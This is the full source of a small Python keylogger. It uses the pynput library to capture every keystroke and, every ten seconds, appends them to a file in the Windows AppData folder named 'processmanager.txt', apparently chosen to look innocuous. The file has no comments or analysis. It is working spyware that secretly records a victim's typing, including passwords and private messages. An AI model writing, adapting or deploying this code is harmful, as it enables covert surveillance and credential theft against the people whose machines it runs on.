#!/usr/bin/python
import pynput.keyboard
import threading
import os

keys = ""
path = os.environ["appdata"] + "\\processmanager.txt"

def process_keys(key):
	global keys
	try:
		keys = keys + str(key.char)
	except AttributeError:
		if key == key.space:
			keys = keys + " "
		else:
			keys = keys + " " + str(key) + " "
def report():
	global keys
	global path
	fin = open(path,"a")
	fin.write(keys)
	keys = ""
	fin.close()
	timer = threading.Timer(10, report)
	timer.start()

def start():
	keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
	with keyboard_listener:
		report()
		keyboard_listener.join()
